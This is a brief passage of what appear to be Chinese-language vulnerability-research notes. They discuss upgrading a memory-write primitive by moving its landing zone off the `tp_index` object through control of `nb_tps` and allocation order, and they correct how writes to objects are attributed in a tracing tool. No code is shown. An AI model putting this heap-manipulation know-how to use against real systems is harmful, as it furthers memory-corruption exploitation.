要升级，必须先让「落点区域」从 `tp_index` 变成别的对象，而这就回到
`nb_tps` / 分配顺序的控制问题上（§4.9~4.12 已测）。

**判据修正**：以后判定“写到了某对象”必须用【B 段自身的事件序列】，
不能用跨段同名地址。`tools/ts.py` 已加此限制说明。
